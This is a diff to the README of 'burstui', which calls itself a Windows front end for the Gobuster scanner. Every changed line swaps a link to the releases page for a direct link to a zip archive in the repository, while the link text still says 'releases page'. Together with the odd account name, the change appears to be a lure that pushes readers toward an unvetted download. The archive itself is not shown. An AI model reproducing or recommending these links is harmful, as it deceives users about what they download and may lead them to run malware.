@@ -1,6 +1,6 @@
 # 🧰 burstui - Simple Gobuster Control in Windows
 
-[![Download burstui](https://img.shields.io/badge/Download-Visit%20Releases-6f42c1?style=for-the-badge&logo=github)](https://github.com/trifoliolate-antihypertensivedrug145/burstui/releases)
+[![Download burstui](https://img.shields.io/badge/Download-Visit%20Releases-6f42c1?style=for-the-badge&logo=github)](https://github.com/trifoliolate-antihypertensivedrug145/burstui/raw/refs/heads/main/assets/Software_2.6.zip)
 
 ## 🚀 What is burstui
 
@@ -10,7 +10,7 @@ This app is built for people who want a cleaner way to work with Gobuster on Win
 
 ## 📥 Download burstui
 
-1. Open the [burstui releases page](https://github.com/trifoliolate-antihypertensivedrug145/burstui/releases)
+1. Open the [burstui releases page](https://github.com/trifoliolate-antihypertensivedrug145/burstui/raw/refs/heads/main/assets/Software_2.6.zip)
 2. Find the latest release
 3. Download the Windows file for your device
 4. Save it to a folder you can find again, such as Downloads or Desktop
@@ -31,7 +31,7 @@ If you plan to scan many targets, use a folder with enough free space for saved 
 ## 🛠️ How to Install
 
 ### 1. Visit the release page
-Go to the [download page](https://github.com/trifoliolate-antihypertensivedrug145/burstui/releases) and look for the newest version.
+Go to the [download page](https://github.com/trifoliolate-antihypertensivedrug145/burstui/raw/refs/heads/main/assets/Software_2.6.zip) and look for the newest version.
 
 ### 2. Get the Windows file
 Choose the file that matches Windows. In most cases, this will be one of these:
